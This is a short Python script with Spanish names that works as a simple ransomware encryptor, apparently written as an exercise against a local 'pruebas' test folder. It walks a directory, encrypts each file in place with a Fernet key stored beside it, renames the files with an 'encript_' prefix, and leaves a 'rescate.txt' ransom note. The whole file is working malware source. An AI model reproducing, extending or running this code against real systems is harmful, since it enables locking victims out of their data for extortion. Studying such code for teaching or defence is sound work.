from cryptography.fernet import Fernet
import os


def generar_clave():
    if not os.path.isfile('clave.key'):
        clave1 = Fernet.generate_key()
        fichero_clave = open('clave.key', 'wb')
        fichero_clave.write(clave1)
        fichero_clave.close()


def obtener_clave(ruta = "clave.key"):
    #fichero=open('clave.key','rb')
    fichero=open(ruta,'rb')

    #DEVUELVE LA CLAVE
    return fichero.readline()


def ruta_absoluta(directorio):
    lista_directorios=[]
    for ruta,subdirectorios,archivos in os.walk(directorio):
        for a in archivos:
            lista_directorios.append(os.path.abspath(os.path.join(ruta, a)))
    return lista_directorios

def encriptar(rutas, clave1, ruta_principal):
    f=Fernet(clave1)
    elem_enciptados = False
    for elemento in rutas:
        fich = open(elemento, 'rb')
        ruta_segmentada = fich.name.split("/")
        if not ruta_segmentada[-1].startswith("encript_"):
            elem_enciptados = True
            contenido_encriptado = f.encrypt(fich.read())
            fich.close()

            fich = open(elemento,'wb')
            fich.write(contenido_encriptado)
            fich.close()
            nuevo_nombre = 'encript_' + ruta_segmentada[-1]
            ruta_segmentada[-1] = nuevo_nombre
            os.rename(fich.name, '/'.join(ruta_segmentada))
        else:
            fich.close()
    if elem_enciptados:
        fichero_rescate = open(ruta_principal + '/rescate.txt', 'w')
        fichero_rescate.write("Se han encriptado archivos!")
        fichero_rescate.close()





if __name__ == '__main__':
    #print(obtener_clave())
    clave = obtener_clave()
    lista_rutas = ruta_absoluta('./pruebas')
    encriptar(lista_rutas, clave, './pruebas')